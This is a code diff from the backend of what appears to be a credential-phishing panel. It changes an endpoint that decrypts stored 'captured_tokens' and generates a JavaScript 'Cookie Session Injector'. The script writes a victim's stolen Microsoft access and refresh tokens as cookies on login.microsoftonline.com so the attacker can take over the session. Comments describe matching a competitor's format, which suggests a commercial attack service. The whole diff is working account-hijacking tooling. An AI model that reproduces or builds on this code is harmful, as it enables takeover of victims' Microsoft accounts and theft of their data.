@@ -88,63 +88,46 @@ router.delete('/:id', userAuth, async (req, res) => {
   }
 });
 
-// Generate cookie script - EXACT competitor format
+// Generate cookie script - EXACT competitor format (only 2 cookies: x-ms-RefreshTokenCredential + RefreshToken)
 router.get('/:id/cookie-script', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
     
     const token = tokens[0];
-    var cookies = decrypt(token.cookies_encrypted);
     const accessToken = decrypt(token.access_token_encrypted);
     const refreshToken = decrypt(token.refresh_token_encrypted);
     
-    // If no stored cookies, convert from access_token
-    if ((!cookies || cookies.trim() === '') && accessToken) {
-      try {
-        const cookieConverter = require('../services/cookieconverter');
-        const result = await cookieConverter.convertTokensToCookies(accessToken, token.template_type);
-        if (result.success && result.cookies) {
-          cookies = result.cookies;
-          await db.query(
-            'UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?',
-            [encrypt(cookies), 'cookie', token.id]
-          );
-        }
-      } catch (convErr) {
-        console.error('[Tokens] Cookie conversion error:', convErr.message);
-      }
+    // Check if we have any tokens to work with
+    if (!accessToken && !refreshToken) {
+      return res.status(400).json({ error: 'No tokens available' });
     }
     
-    if (!cookies || cookies.trim() === '') {
-      return res.status(400).json({
-        error: 'No cookies available. Please use the Renew button first.',
-        has_access_token: !!token.access_token_encrypted
-      });
-    }
-    
-    // Build array of ALL parts: cookies + tokens
+    // Build ONLY the 2 token cookies like competitor (NO stored cookies array)
     var parts = [];
-    var cookieArray = cookies.split(';').map(function(c) { return c.trim(); }).filter(function(c) { return c; });
-    for (var i = 0; i < cookieArray.length; i++) {
-      parts.push(cookieArray[i]);
-    }
     
-    // Add access_token as x-ms-RefreshTokenCredential
+    // x-ms-RefreshTokenCredential = access_token (like competitor's first cookie)
     if (accessToken) {
       parts.push('x-ms-RefreshTokenCredential=' + accessToken);
     }
     
-    // Add refresh_token
+    // RefreshToken = refresh_token (like competitor's second cookie)
     if (refreshToken) {
       parts.push('RefreshToken=' + refreshToken);
     }
     
-    // Build script 
+    if (parts.length === 0) {
+      return res.status(400).json({ error: 'No tokens available' });
+    }
+    
+    // Build script
     var script = '// VGenius Cookie Session Injector\n\n';
+    
+    // Each cookie on its own line with domain=.login.microsoftonline.com
     for (var i = 0; i < parts.length; i++) {
       script += 'document.cookie = "' + parts[i] + '; domain=.login.microsoftonline.com; path=/; secure; samesite=none";\n';
     }
+    
     script += '\n';
     script += '// Redirect after 3s\n';
     script += 'setTimeout(() => {\n';
@@ -162,7 +145,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
   }
 });
 
-// Manual cookie renewal
+// Manual cookie renewal - converts access_token to cookies
 router.post('/:id/renew', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
